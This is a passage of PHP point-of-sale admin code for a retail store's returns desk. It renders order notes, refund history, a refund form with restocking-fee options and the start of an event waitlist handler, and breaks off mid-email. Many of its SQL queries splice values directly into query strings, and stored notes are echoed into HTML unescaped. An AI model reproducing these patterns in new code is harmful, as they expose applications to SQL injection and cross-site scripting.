    $addnotescontent = '<form action="/store/index.php" method="post"><b>Add Notes:</b><br/><input type="hidden" name="action" value="add_notes" /><input type="hidden" name="orderid" value="' . $orderinfo['orders_id'] . '" /><input type="hidden" name="post_action" value="refund_display" /><textarea name="order_notes" style="width:100%;height:60px;font-size:14px;"></textarea><button style="font-size:12px;padding:3px 5px 2px;" onclick="this.form.submit();">Save Notes</button></form>';
    $notescontent = '';
    $notesquery = mysqli_query( $link, "SELECT pon.*, pu.pos_users_firstname, pu.pos_users_lastname FROM orders_notes pon LEFT JOIN pos_users pu ON pon.pos_users_id=pu.pos_users_id WHERE pon.orders_id='" . $orderinfo['orders_id'] . "'" );
    while ( $notesinfo = mysqli_fetch_array( $notesquery ) ) {
      $posrep = '';
      if ( $notesinfo['pos_users_firstname'] != '' || $notesinfo['pos_users_lastname'] != '' ) { $posrep = ' (' . substr( $notesinfo['pos_users_firstname'], 0, 1 ) . substr( $notesinfo['pos_users_lastname'], 0, 1 ) . ')'; }
      $notesinfo['orders_notes'] = str_replace( "\n", '<br/>', $notesinfo['orders_notes'] );
      $notesinfo['orders_notes'] = str_replace( "\'", "'", $notesinfo['orders_notes'] );
      if ( preg_match( '/POS notes by ([\w]+) ([\w]+):/', $notesinfo['orders_notes'], $onotematches ) ) {
        $posrep = ' (' . substr( $onotematches[1], 0, 1 ) . substr( $onotematches[2], 0, 1 ) . ')';
        $notesinfo['orders_notes'] = preg_replace( '/' . $onotematches[0] . '<br\/>/', '', $notesinfo['orders_notes'] );
      }
      elseif ( preg_match( '/ID information collected by: ([\w]+) ([\w]+)/', $notesinfo['orders_notes'], $onotematches ) ) {
        $posrep = ' (' . substr( $onotematches[1], 0, 1 ) . substr( $onotematches[2], 0, 1 ) . ')';
        $notesinfo['orders_notes'] = preg_replace( '/' . $onotematches[0] . '<br\/>/', '', $notesinfo['orders_notes'] );
      }
      if ( $posrep == '' && $notesinfo['admin_id'] > 0 ) {
        $adminquery = mysqli_query( $link, "SELECT * FROM admin WHERE admin_id='" . (int)$notesinfo['admin_id'] . "'" );
        $admininfo = mysqli_fetch_array( $adminquery );
        if ( $admininfo['admin_firstname'] != '' || $admininfo['admin_lastname'] != '' ) { $posrep = ' (' . substr( $admininfo['admin_firstname'], 0, 1 ) . substr( $admininfo['admin_lastname'], 0, 1 ) . ')'; }
      }
      if ( $notescontent != '' ) { $notescontent .= '<br/>'; }
      $notescontent .= '<i>' . date( "F j, Y, g:ia", strtotime( $notesinfo['orders_notes_created'] ) ) . $posrep . '</i><br/>' . $notesinfo['orders_notes'] . '<br/>';
    }
    if ( $notescontent != '' ) { echo '<div class="receiptnotes"><h4>Notes</h4><p>' . $notescontent . '</p>' . $addnotescontent . '(Notes must be saved separately from refund)</div>'; }
    else { echo '<div class="receiptnotes"><h4>Notes</h4>' . $addnotescontent . '</div>'; }
    echo '</div>';

    $breakdowncounter = 0;
    $refundcontent = '';
    /*$refundquery = mysqli_query( $link, "SELECT oref.*, pu.pos_users_firstname, pu.pos_users_lastname FROM orders_refunds oref LEFT JOIN pos_users pu ON oref.pos_users_id=pu.pos_users_id WHERE oref.orders_id='" . $orderinfo['orders_id'] . "' ORDER BY orders_refunds_date ASC, orders_products_id ASC" );
    while ( $refundinfo = mysqli_fetch_array( $refundquery ) ) {
      $posrep = '';
      if ( $refundinfo['pos_users_firstname'] != '' || $refundinfo['pos_users_lastname'] != '' ) { $posrep = substr( $refundinfo['pos_users_firstname'], 0, 1 ) . substr( $refundinfo['pos_users_lastname'], 0, 1 ); }
      if ( $posrep == '' && $refundinfo['admin_id'] > 0 ) {
        $adminquery = mysqli_query( $link, "SELECT * FROM admin WHERE admin_id='" . (int)$refundinfo['admin_id'] . "'" );
        $admininfo = mysqli_fetch_array( $adminquery );
        if ( $admininfo['admin_firstname'] != '' || $admininfo['admin_lastname'] != '' ) { $posrep = substr( $admininfo['admin_firstname'], 0, 1 ) . substr( $admininfo['admin_lastname'], 0, 1 ); }
      }
      $refundcontent .= '<tr><td>' . $refundinfo['orders_refunds_date'] . '</td><td>' . $refundinfo['orders_refunds_type'] . '</td><td>' . $refundinfo['orders_refunds_amount'] . '</td><td>' . $posrep . '</td><td>' . $refundinfo['orders_refunds_method'] . '</td></tr>';
    }
    if ( $refundcontent != '' ) {
      echo '<div class="receiptnotes"><h4>Refund Options</h4><table>';
      echo '<tr><th>Date</th><th>For</th><th>Amount</th><th>By</th><th>Method</th></tr>';
      echo $refundcontent;
      echo '</table></div>';
    }*/

    #$refunddayquery = mysqli_query( $link, "SELECT * FROM orders_refunds WHERE orders_id='" . $orderinfo['orders_id'] . "' GROUP BY orders_refunds_date ORDER BY orders_refunds_date ASC" ); # Updated to group everything within a minute together
    $refunddayquery = mysqli_query( $link, "SELECT *, ( unix_timestamp( orders_refunds_date ) - unix_timestamp(orders_refunds_date)%60 ) orders_refunds_date_min FROM orders_refunds WHERE orders_id='" . $orderinfo['orders_id'] . "' GROUP BY orders_refunds_date_min ORDER BY orders_refunds_date ASC" );
    while ( $refunddayinfo = mysqli_fetch_array( $refunddayquery ) ) {
      $refundtotal = array();
      $refundbreakdown = array();
      #$refundquery = mysqli_query( $link, "SELECT * FROM orders_refunds WHERE orders_id='" . $orderinfo['orders_id'] . "' AND orders_refunds_date='" . $refunddayinfo['orders_refunds_date'] . "'" );
      $refundquery = mysqli_query( $link, "SELECT * FROM orders_refunds WHERE orders_id='" . $orderinfo['orders_id'] . "' AND orders_refunds_date>='" . date( "Y-m-d G:i", strtotime( $refunddayinfo['orders_refunds_date'] ) ) . ":00' AND orders_refunds_date<='" . date( "Y-m-d G:i", strtotime( $refunddayinfo['orders_refunds_date'] ) ) . ":59'" );
      while ( $refundinfo = mysqli_fetch_array( $refundquery ) ) {
        if ( $refundinfo['orders_refunds_qty'] > 0 ) { $refundtotal[$refundinfo['orders_refunds_method']] += $refundinfo['orders_refunds_amount'] * $refundinfo['orders_refunds_qty']; }
        else { $refundtotal[$refundinfo['orders_refunds_method']] += $refundinfo['orders_refunds_amount']; }
        if ( $refundinfo['orders_refunds_type'] == 'products' ) { $refundbreakdown[$refundinfo['orders_refunds_method']] .= '$' . number_format( $refundinfo['orders_refunds_amount'] * $refundinfo['orders_refunds_qty'], 2 ) . ' - PID ' . $refundinfo['products_id'] . ' x' . $refundinfo['orders_refunds_qty'] . '<br/>'; }
        elseif ( $refundinfo['orders_refunds_type'] == 'products_tax' ) { $refundbreakdown[$refundinfo['orders_refunds_method']] .= '$' . number_format( $refundinfo['orders_refunds_amount'] * $refundinfo['orders_refunds_qty'], 2 ) . ' - PID ' . $refundinfo['products_id'] . ' x' . $refundinfo['orders_refunds_qty'] . ' (Tax)<br/>'; }
        elseif ( $refundinfo['orders_refunds_type'] == 'shipping' ) { $refundbreakdown[$refundinfo['orders_refunds_method']] .= '$' . number_format( $refundinfo['orders_refunds_amount'], 2 ) . ' - Shipping<br/>'; }
        elseif ( $refundinfo['orders_refunds_type'] == 'manual' ) { $refundbreakdown[$refundinfo['orders_refunds_method']] .= '$' . number_format( $refundinfo['orders_refunds_amount'], 2 ) . ' - Manual<br/>'; }
      }
      $posrep = '';
      if ( $refunddayinfo['pos_users_id'] > 0 ) {
        $puquery = mysqli_query( $link, "SELECT * FROM pos_users WHERE pos_users_id='" . (int)$refunddayinfo['pos_users_id'] . "'" );
        $puinfo = mysqli_fetch_array( $puquery );
        if ( $puinfo['pos_users_firstname'] != '' || $puinfo['pos_users_lastname'] != '' ) { $posrep = substr( $puinfo['pos_users_firstname'], 0, 1 ) . substr( $puinfo['pos_users_lastname'], 0, 1 ); }
      }
      if ( $posrep == '' && $refunddayinfo['admin_id'] > 0 ) {
        $adminquery = mysqli_query( $link, "SELECT * FROM admin WHERE admin_id='" . (int)$refunddayinfo['admin_id'] . "'" );
        $admininfo = mysqli_fetch_array( $adminquery );
        if ( $admininfo['admin_firstname'] != '' || $admininfo['admin_lastname'] != '' ) { $posrep = substr( $admininfo['admin_firstname'], 0, 1 ) . substr( $admininfo['admin_lastname'], 0, 1 ); }
      }
      foreach ( $refundtotal as $refundmethod => $refundamount ) {
        $refundcontent .= '<tr><td>' . $refunddayinfo['orders_refunds_date'] . '</td><td><a onclick="$(\'#breakdownbox' . $breakdowncounter . '\').show();" style="cursor:pointer;">$' . number_format( $refundamount, 2 ) . '</a><div id="breakdownbox' . $breakdowncounter . '" class="donotprint" style="display:none;border-top:1px solid #000;">' . $refundbreakdown[$refundmethod] . '</div></td><td>' . $refundmethod . '</td><td>' . $posrep . '</td></tr>';
        $breakdowncounter++;
      }
    }
    if ( $refundcontent != '' ) {
      echo '<style>.refundtable th { border-bottom: 2px solid #000; } .refundtable td { padding: 2px 10px; text-align: center; }</style>';
      echo '<div class="refundhistory"><h4>Refund History</h4><table class="refundtable">';
      echo '<tr><th>Date</th><th>Amount</th><th>Method</th><th>Staff</th></tr>';
      echo $refundcontent;
      echo '</table></div>';
    }

    $refund_order_products = 0;
    $refund_order_shipping = 0;
    $refund_order_total = 0;
    $orderproductsquery = mysqli_query( $link, "SELECT * FROM orders_products WHERE orders_id='" . $orderinfo['orders_id'] . "' ORDER BY orders_products_id ASC" );
    while ( $orderproductsinfo = mysqli_fetch_array( $orderproductsquery ) ) {
      if ( $orderproductsinfo['products_quantity'] <= 0 ) { continue; }
      $refund_order_products++;
    }
    $ordertotal_query = mysqli_query( $link, "SELECT * FROM orders_total WHERE orders_id='" . $orderinfo['orders_id'] . "'" );
    while ( $ordertotal_info = mysqli_fetch_array( $ordertotal_query ) ) {
      if ( $ordertotal_info['class'] == 'ot_shipping' ) { $refund_order_shipping = $ordertotal_info['value']; }
      elseif ( $ordertotal_info['class'] == 'ot_total' ) { $refund_order_total = $ordertotal_info['value']; }
    }
    echo '<form action="/store/index.php" method="post" onsubmit="saveButton.disabled=true;return true;">';
    echo '<input type="hidden" name="action" value="save_refund" />';
    echo '<input type="hidden" name="orderid" value="' . $orderinfo['orders_id'] . '" />';
    echo '<input type="hidden" id="refund_total_products" name="refund_total_products" value="' . $refund_order_products . '" />';
    echo '<input type="hidden" id="refund_order_shipping" name="refund_order_shipping" value="' . $refund_order_shipping . '" />';
    echo '<input type="hidden" id="refund_order_total" name="refund_order_total" value="' . $refund_order_total . '" />';
    echo '<div class="receiptnotes"><h4>Refund Options</h4><table>';
    #echo '<tr><td align="right"><h5>Charge Restocking Fee (15%)?</h5></td><td><select id="chargersf" name="chargersf" style="margin-left: 20px; padding: 5px 8px; font-size: 14px;" onchange="refundcalc();"><option value="0">No</option><option value="1">Yes</option></select></td></tr>';
    echo '<tr><td align="right"><b>Charge Restocking Fee?</b></td><td><select id="chargersf" name="chargersf" style="margin-left: 20px; padding: 5px 8px; font-size: 14px;" onchange="refundcalc();"><option value="0">No</option><option value="10">10%</option><option value="1">15%</option><option value="25">25%</option><option value="50">50%</option></select></td></tr>';
    echo '<tr><td align="right"><h5>Refund All Products?</h5></td><td><button style="margin: 5px 10px 5px 20px; padding: 8px 12px;" onclick="refundall();return false;">Yes</button></td></tr>';
    echo '</table></div>';
    if ( $msg != '' ) { echo '<p class="message donotprint">' . $msg . '</p>'; }

    $productindex = 0;
    $requiredisclaimer = false;
    if ( $coupondata['coupons_id'] == 'serve' && strtotime( $orderinfo['date_purchased'] ) < strtotime( '2018-01-18 00:00:00' ) ) { echo '<div><h3 style="color:red;">Warning: This order had discount code "serve" applied and MAP products may not show the correct refund value, although adjustments have been made where possible. Please double check before refunding customer.</h3></div>'; }
    echo '<table class="checkoutproducts">';
    #echo '<tr><th>Product Description</th><th>Price</th><th>Price<br/>(Coupon Applied)</th><!--<th>Unit Refund Price<br/>(Coupon Applied incl. Tax)</th><th>Unit Refund Price (RSF)<br/>(Coupon Applied incl. Tax)</th>--><th>Order Qty</th><th>Returned/Refunded Qty</th><th>Qty to Refund</th></tr>';
    echo '<tr><th>Product<br/>Description</th><th>Unit<br/>Price</th><th>Unit Price<br/>(Coupon Applied)</th><th>Unit Refund Price<br/>(Coupon Applied incl. Tax)</th><th>Order<br/>Qty</th><th>Returned<br/>Refunded Qty</th><th>Qty to Refund</th></tr>';
    $orderproductsquery = mysqli_query( $link, "SELECT * FROM orders_products WHERE orders_id='" . $orderinfo['orders_id'] . "' ORDER BY orders_products_id ASC" );
    while ( $orderproductsinfo = mysqli_fetch_array( $orderproductsquery ) ) {
      $qtyadjustmentcontent = '';
      $returnrefundqty = 0;
      $refundedqty = 0;
      $refundsquery = mysqli_query( $link, "SELECT * FROM orders_refunds WHERE orders_id='" . $orderinfo['orders_id'] . "' AND orders_refunds_type='products' AND orders_products_id='" . $orderproductsinfo['orders_products_id'] . "'" );
      while ( $refundsinfo = mysqli_fetch_array( $refundsquery ) ) { $refundedqty += $refundsinfo['orders_refunds_qty']; }
      $rmaquery = mysqli_query( $link, "SELECT * FROM orders_rma WHERE orders_rma_status IN ( 'Submitted', 'Authorized', 'Cancelled' ) AND orders_id='" . $orderinfo['orders_id'] . "' AND orders_products_id='" . $orderproductsinfo['orders_products_id'] . "'" );
      $rmainfo = mysqli_fetch_array( $rmaquery );
      $totalrefundable = $orderproductsinfo['products_quantity'] - $refundedqty - $rmainfo['orders_rma_qty'];
      if ( $refundedqty > 0 ) { $qtyadjustmentcontent = '<br/><i>' . $refundedqty . ' returned/refunded</i>'; $returnrefundqty += $refundedqty; }
      if ( $rmainfo['orders_rma_qty'] > 0 ) { $qtyadjustmentcontent = '<br/><i>' . $rmainfo['orders_rma_qty'] . ' pending RMA request</i>'; $returnrefundqty += $rmainfo['orders_rma_qty']; }
      if ( $splitchildren[$orderproductsinfo['products_id']] > 0 ) { $orderproductsinfo['products_quantity'] -= $splitchildren[$orderproductsinfo['products_id']]; $totalrefundable -= $splitchildren[$orderproductsinfo['products_id']]; }
      foreach ( $splitpackages as $parentpid => $childproducts ) {
        foreach ( $childproducts as $childpid => $childqty ) {
          if ( $orderproductsinfo['products_id'] == $childpid ) { $splitparents[$parentpid]['price'] += $orderproductsinfo['final_price'] * $childqty; $splitparents[$parentpid]['discount'] += $orderproductsinfo['products_discount'] * $childqty; }
        }
      }
      if ( $orderproductsinfo['products_quantity'] <= 0 ) { continue; }
      if ( $coupondata['coupons_id'] == 'serve' && strtotime( $orderinfo['date_purchased'] ) < strtotime( '2018-01-18 00:00:00' ) && $orderproductsinfo['products_discount'] > $orderproductsinfo['final_price'] * 0.1 ) {
        $productquery = mysqli_query( $link, "SELECT * FROM products WHERE products_id='" . (int)$orderproductsinfo['products_id'] . "'" );
        $productdata = mysqli_fetch_array( $productquery );
        $mapquery = mysqli_query( $link, "SELECT manufacturers_map FROM manufacturers WHERE manufacturers_id='" . (int)$productdata['manufacturers_id'] . "'" );
        $mapresult = mysqli_fetch_array( $mapquery );
        if ( $mapresult['manufacturers_map'] == 'Enforced' || $productdata['products_map'] == 1 ) { $orderproductsinfo['products_discount'] = round( $orderproductsinfo['final_price'] * 0.10, 2 ); }
      }
      $productcatquery = mysqli_query( $link, "SELECT categories_id FROM products_to_categories WHERE products_id='" . $orderproductsinfo['products_id'] . "'" );
      while ( $productcatinfo = mysqli_fetch_array( $productcatquery ) ) { if ( in_array( $productcatinfo['categories_id'], $disclaimercats ) && !in_array( $orderproductsinfo['products_id'], $disclaimerexclusionproducts ) ) { $requiredisclaimer = true; } }

      $refundprice = round( $orderproductsinfo['final_price']-$orderproductsinfo['products_discount'], 2 );
      $refundtax = round( ($orderproductsinfo['final_price']-$orderproductsinfo['products_discount'])*0.01*($orderproductsinfo['products_tax']), 2 );
      $refundrsfprice = round( ($orderproductsinfo['final_price']-$orderproductsinfo['products_discount'])*0.85, 2 );
      //$refundrsftax = round( (($orderproductsinfo['final_price']-$orderproductsinfo['products_discount'])*0.85)*0.01*($orderproductsinfo['tax']), 2 );
      $refundrsftax = $refundtax; // Even when charging RSF, tax should be refunded in full
      $showtaxrate = '';
      if ( $orderproductsinfo['products_tax'] > 0 ) { $showtaxrate = ' (' . number_format( $orderproductsinfo['products_tax'], 2, '.', '' ) . '%)'; }
      echo '<input type="hidden" name="refundprodpid[]" value="' . $orderproductsinfo['products_id'] . '" />';
      echo '<input type="hidden" name="refundorderprodpid[]" value="' . $orderproductsinfo['orders_products_id'] . '" />';
      echo '<input type="hidden" id="refundprodprice' . $productindex . '" name="refundprodprice[]" value="' . $refundprice . '" />';
      echo '<input type="hidden" id="refundprodtax' . $productindex . '" name="refundprodtax[]" value="' . $refundtax . '" />';
      echo '<input type="hidden" id="refundprodrsfprice' . $productindex . '" name="refundprodrsfprice[]" value="' . $refundrsfprice . '" />';
      echo '<input type="hidden" id="refundprodrsftax' . $productindex. '" name="refundprodrsftax[]" value="' . $refundrsftax . '" />';
      echo '<tr>';
      echo '<td class="main" valign="top">' . $orderproductsinfo['products_name'];
      echo '<br/><small>(PID: ' . $orderproductsinfo['products_id'] . ' / Model: ' . $orderproductsinfo['products_model'] . ')</small>';
      if ( $orderproductsinfo['products_multisplit_parent_pid'] > 0 ) { echo '<small style="margin-left:10px;color:red;">* Part of package (' . $orderproductsinfo['products_multisplit_parent_pid'] . ')</small>'; }
      echo '</td>';
      echo '<td class="main" align="right" valign="top">$' . number_format( $orderproductsinfo['final_price'], 2 ) . '</td>';
      echo '<td class="main" align="right" valign="top">$' . number_format( $orderproductsinfo['final_price'] - $orderproductsinfo['products_discount'], 2 ) . '</td>';
      #echo '<td class="main" align="right" valign="top">$' . number_format( ( $orderproductsinfo['final_price'] - $orderproductsinfo['products_discount'] ) * ( 1 + ( $orderproductsinfo['products_tax'] / 100 ) ), 2 ) . '</td>';
      #echo '<td class="main displaynorsf" style="background-color:#ddf;font-weight:bold;" align="right" valign="top"><span>$' . number_format( $refundprice + $refundtax, 2, '.', ',' ) . '</span>' . $showtaxrate . '</td>';
      echo '<td class="main displaynorsf" id="displaynorsf' . $productindex . '" style="background-color:#ddf;font-weight:bold;" align="right" valign="top">$' . number_format( $refundprice + $refundtax, 2, '.', ',' ) . '</td>';
      #echo '<td class="main displayyesrsf" align="right" valign="top"><span>$' . number_format( $refundrsfprice + $refundrsftax, 2, '.', ',' ) . '</span>' . $showtaxrate . '</td>';
      echo '<td class="main" align="right" valign="top">' . number_format( $orderproductsinfo['products_quantity'] ) . '</td>';
      echo '<td class="main" align="right" valign="top">' . (int)$returnrefundqty . '</td>';
      echo '<td class="main" align="right" valign="top">';
      if ( $totalrefundable > 0 ) {
        echo '<select name="refundprodqty[]" id="refundprodqty' . $productindex . '" class="refundprodqty" style="padding: 5px 8px; font-size: 14px;" onchange="refundcalc();">';
        for ( $j = 0; $j <= $totalrefundable; $j++ ) { echo '<option>' . $j . '</option>'; }
        echo '</select></td>' . "\n";
      }
      else {
        echo '<input type="hidden" name="refundprodqty[]" id="refundprodqty' . $productindex . '" value="0" />';
        echo 'N/A</td>' . "\n";
      }
      #echo '<td class="main" align="right" valign="top">$' . number_format( $orderproductsinfo['final_price'] * $orderproductsinfo['products_quantity'], 2 ) . '</td>';
      echo '</tr>' . "\n";
      $productindex++;
    }
    #foreach ( $splitpackages as $parentpid => $childproducts ) {
    foreach ( $splitparents as $parentpid => $parentdata ) {
      $product_query = mysqli_query( $link, "SELECT * FROM products p LEFT JOIN products_description pd ON p.products_id=pd.products_id WHERE p.products_id='" . $parentpid . "'" );
      $product_data = mysqli_fetch_array( $product_query );
      echo '<tr>';
      echo '<td class="main" valign="top">' . $product_data['products_name'];
      echo '<br/><small>(PID: ' . $parentpid . ' / Model: ' . $product_data['products_model'] . ')</small>';
      echo '</td>';
      echo '<td class="main" align="right" valign="top">$' . number_format( $splitparents[$parentpid]['price'], 2 ) . '</td>';
      echo '<td class="main" align="right" valign="top">$' . number_format( $splitparents[$parentpid]['price'] - $splitparents[$parentpid]['discount'], 2 ) . '</td>';
      #echo '<td class="main" align="right" valign="top">$' . number_format( $splitparents[$parentpid]['price'] - $splitparents[$parentpid]['discount'], 2 ) . '</td>';
      #echo '<td class="main" align="right" valign="top">$' . number_format( ( $splitparents[$parentpid]['price'] - $splitparents[$parentpid]['discount'] ) * ( 1 + ( $orderproductsinfo['products_tax'] / 100 ) ), 2 ) . '</td>';
      echo '<td class="main" align="right" valign="top">' . number_format( $splitparents[$parentpid]['qty'] ) . '</td>';
      echo '<td class="main" align="right" valign="top">-</td>';
      echo '<td class="main" align="right" valign="top">-</td>';
      echo '<td class="main" align="right" valign="top">-</td>';
      #echo '<td class="main" align="right" valign="top">$' . number_format( number_format( $splitparents[$parentpid]['price'], 2 ) * $splitparents[$parentpid]['qty'], 2 ) . '</td>';
      echo '</tr>' . "\n";
    }

    $balancedue = 0;
    $isdiscount = false;
    $ordertotalsquery = mysqli_query( $link, "SELECT * FROM orders_total WHERE orders_id='" . $orderinfo['orders_id'] . "' ORDER BY sort_order ASC" );
    while ( $ordertotalsinfo = mysqli_fetch_array( $ordertotalsquery ) ) {
      if ( $ordertotalsinfo['class'] == 'ot_discount_coupon' ) { $isdiscount = true; }
      if ( $ordertotalsinfo['class'] == 'ot_subtotal' && $isdiscount == true ) {
        echo '<tr><td colspan="6" style="text-align:right;">Subtotal (After Discount):</td><td>' . $ordertotalsinfo['text'] . '</td></tr>' . "\n";
      }
      else { echo '<tr><td colspan="6" style="text-align:right;">' . $ordertotalsinfo['title'] . '</td><td>' . $ordertotalsinfo['text'] . '</td></tr>' . "\n"; }
      if ( $ordertotalsinfo['class'] == 'ot_total' ) { $balancedue = $ordertotalsinfo['value']; }
    }
    $orderpaymentsquery = mysqli_query( $link, "SELECT * FROM payments_store WHERE orders_id='" . $orderinfo['orders_id'] . "'" );
    while ( $orderpaymentsinfo = mysqli_fetch_array( $orderpaymentsquery ) ) {
      if ( $orderpaymentsinfo['payments_store_amount'] < 0 ) {
        if ( $orderpaymentsinfo['payments_store_method'] == 'Cash' ) { $orderpaymentsinfo['payments_store_method'] = 'Change'; }
        echo '<tr><td colspan="6" style="text-align:right;">' . $orderpaymentsinfo['payments_store_method'] . ':</td><td>$' . number_format( $orderpaymentsinfo['payments_store_amount'] * -1, 2 ) . '</td></tr>' . "\n";
      }
      else {
        echo '<tr><td colspan="6" style="text-align:right;">' . $orderpaymentsinfo['payments_store_method'] . ':</td><td>-$' . number_format( $orderpaymentsinfo['payments_store_amount'], 2 ) . '</td></tr>' . "\n";
      }
      $balancedue -= round( $orderpaymentsinfo['payments_store_amount'], 2 );
    }
    if ( $balancedue < 0 ) { echo '<tr><td colspan="6" style="text-align:right;"><b>Credit:</b></td><td><b>$' . number_format( $balancedue * -1, 2 ) . '</b></td></tr>' . "\n"; }
    #else { echo '<tr><td colspan="6" style="text-align:right;"><b>Balance:</b></td><td><b>$' . number_format( $balancedue, 2 ) . '</b></td></tr>' . "\n"; }
    echo '</table>';

    #$refundmethods = array( 'Cancel Order', 'Cancel Item', 'Cancel Backorder', 'Cancel Preorder', 'RMA Refund', 'Shipping Refund', 'Chargeback', 'Other' );
    $refundmethods = array( 'Credit Card', 'Cash', 'Store Credit', 'Gift Card' );
    foreach ( $refundmethods as $refundmethod ) { $refundmethodlist .= '<option>' . $refundmethod . '</option>'; }
    echo '<div class="receiptnotes" style="width:400px;margin-left:auto;"><h4>Refund Totals</h4><table align="center">';
    echo '<input type="hidden" name="refund_reason" value="" />';
    echo '<tr><td align="right"><h5>Refund Method</h5></td><td align="center"><select name="refund_method" style="margin-left: 20px; padding: 5px 8px; font-size: 14px;"><option value="">Select method</option>' . $refundmethodlist . '</select></td></tr>';
    echo '<tr><td align="right"><h5>Total Product Refund</h5></td><td align="center"><input type="text" id="refund_totprod" name="refund_totprod" value="0.00" readonly="readonly" style="width:100px;background:#f5f5f5;border:1px solid #888;text-align:right;margin: 2px; padding: 5px 6px; font-size: 14px;" /></td></tr>';
    echo '<tr><td align="right"><h5>Total Tax Refund</h5></td><td align="center"><input type="text" id="refund_tottax" name="refund_tottax" value="0.00" readonly="readonly" style="width:100px;background:#f5f5f5;border:1px solid #888;text-align:right;margin: 2px; padding: 5px 6px; font-size: 14px;" /></td></tr>';
    if ( $refund_order_shipping > 0 ) { echo '<tr><td align="right"><h5>Shipping Refund</h5></td><td align="center"><input type="text" id="refund_shipping" name="refund_shipping" value="0.00" style="width:100px;background:#fff;border:1px solid #888;text-align:right;margin: 2px; padding: 5px 6px; font-size: 14px;" onblur="this.value=formatdollars(this.value);if(this.value==\'\'){this.value=\'0.00\'}refundcalc();" /></td></tr>'; }
    else { echo '<input type="hidden" id="refund_shipping" name="refund_shipping" value="0.00" />'; }
    echo '<tr><td align="right"><h5>Manual Refund Adjustment</h5></td><td align="center"><input type="text" id="refund_manual" name="refund_manual" value="0.00" style="width:100px;background:#fff;border:1px solid #888;text-align:right;margin: 2px; padding: 5px 6px; font-size: 14px;" onblur="this.value=formatdollars(this.value);if(this.value==\'\'){this.value=\'0.00\'}refundcalc();" /></td></tr>';
    echo '<tr><td align="right"><h4>Total Refund</h4></td><td align="center"><input type="text" id="refund_total" name="refund_total" value="0.00" readonly="readonly" style="width:100px;background:#f5f5f5;border:1px solid #888;text-align:right;margin: 2px; padding: 5px 6px; font-size: 14px;" /></td></tr>';
    echo '</table>';
    echo '<button name="saveButton" class="savebutton" style="margin:25px auto;" onclick="if(confirm(\'Are you sure you want to process and save this refund? Refunds cannot be undone.\')){this.disabled=true;this.form.submit();}else{return false;}">Save and Process Refund</button>';
    echo '</div>';
    echo '</form>';
  }
  else { $errormsg = 'Order not found.'; }
}
else {
?>
  <div class="adminheader" style="background:#044;">
   <img class="adminlogo" src="https://www.evike.com/images3/logo-evike-wht.png" alt="Evike.com Alhambra" />
   <h3 style="float:left;margin:4px 0 0;padding:0 0 0 10px;font-weight:bold;text-transform:uppercase;">Fishing/TCG/Legacy Returns</h3>
   <?php if ( $loginusername != '' ) { echo '<a style="display:block;float:right;margin:8px 15px 0 0;font-size:12px;font-weight:bold;">' . $loginusername . '</a>'; } ?>
   <a href="/store/index.php?action=signout" class="headerlink">Sign Out</a>
   <?php if ( ( ( strtotime( "now" ) > strtotime( '2019-10-18 00:00:00' ) && strtotime( "now" ) < strtotime( '2019-10-20 00:00:00' ) ) ) && $loginuser != 84 && $loginuser != 85 ) { echo '<a href="/store/index.php?action=waitlist" class="headerlink">Waitlist</a>'; } ?>
   <?php if ( ( ( strtotime( "now" ) > strtotime( '2019-10-18 00:00:00' ) && strtotime( "now" ) < strtotime( '2019-10-20 00:00:00' ) ) ) && $loginuser != 84 && $loginuser != 85 ) { echo '<a href="/store/index.php?action=guestlist" class="headerlink">AirsoftCON Guests</a>'; } ?>
   <?php if ( strtotime( "now" ) > strtotime( '2019-10-18 00:00:00' ) && strtotime( "now" ) < strtotime( '2019-10-20 00:00:00' ) && $loginuser != '3333' ) { echo '<a href="/store/index.php?action=event_pickup" class="headerlink">AirsoftCON Sack Pickup</a>'; } ?>
   <?php if ( strtotime( "now" ) > strtotime( '2019-10-13 00:00:00' ) && strtotime( "now" ) < strtotime( '2019-10-20 00:00:00' ) && $loginuser != '3333' ) { echo '<a href="/store/index.php?action=event_waiver" class="headerlink">AirsoftCON Waiver</a>'; } ?>
   <?php if ( ( in_array( date( "Y-m-d" ), array( '2024-08-09', '2024-08-10' ) ) ) || ( in_array( date( "Y-m-d" ), array( '2024-10-18', '2024-10-19' ) ) && $outpost_id == 5 ) ) { echo '<a href="/store/index.php?action=event_pickup" class="headerlink">Event Item Pickup</a>'; } ?>
   <?php if ( $loginuser != 84 && $loginuser != 85 ) { ?>
   <a href="/store/index.php?action=storelabels" class="headerlink">Store Labels</a>
   <?php if ( in_array( $loginuser, $adminusers ) && $loginuser == '33' ) { echo '<a href="/store/index.php?action=daily_settlement" class="headerlink">EOD Settlement</a>'; } ?>
   <a href="/store/index.php?action=daily_register" class="headerlink">Daily Register Report</a>
   <a href="/store/index.php?action=refund_lookup" class="headerlink">Refund Lookup</a>
   <a href="/store/index.php?action=receipt_lookup" class="headerlink">Receipt Lookup</a>
   <?php echo '<a href="/store/index.php?action=willcall_pickup" class="headerlink">Will Call</a>'; ?>
   <a href="/store/index.php?action=checkout" class="headerlink">Checkout</a>
   <?php } ?>
  </div>
  <div class="poscontent">
<?php
  if ( $action == 'waitlist' ) {
    $waitlistnum = 0;
    $waitlistquery = mysqli_query( $link, "SELECT * FROM pos_waitlist WHERE pos_waitlist_timestamp>'" . date( "Y-m-d" ) . " 00:00:00' ORDER BY pos_waitlist_number DESC" );
    $waitlistinfo = mysqli_fetch_array( $waitlistquery );
    if ( $waitlistinfo['pos_waitlist_number'] > $waitlistnum ) { $waitlistnum = $waitlistinfo['pos_waitlist_number']; }
    $newwaitlistnum = trim( $_REQUEST['waitlistnum'] );
    if ( (int)$newwaitlistnum > 0 && (int)$newwaitlistnum > $waitlistnum ) {
      $insertquery = mysqli_query( $link, "INSERT INTO pos_waitlist ( pos_waitlist_number, pos_waitlist_timestamp, pos_users_id ) VALUES ( '" . (int)$newwaitlistnum . "', NOW(), '" . $loginuser . "' )" );
      $notifyquery = mysqli_query( $link, "SELECT * FROM waivers WHERE event='" . $event_code . "' AND checkin_count>0 AND CAST( wristband AS UNSIGNED )>" . (int)$waitlistnum . " AND CAST( wristband AS UNSIGNED )<=" . (int)$newwaitlistnum );
      while( $notifyinfo = mysqli_fetch_array( $notifyquery ) ) {
        #$msg .= "Notifying " . $notifyinfo['wristband'] . " - " . $notifyinfo['email'] . " - " . $notifyinfo['phone'] . "<br/>";
        if ( $notifyinfo['email'] != '' ) {
          $email_subject = "Your Turn! Shop at the AirsoftCON 2019 Superstore";
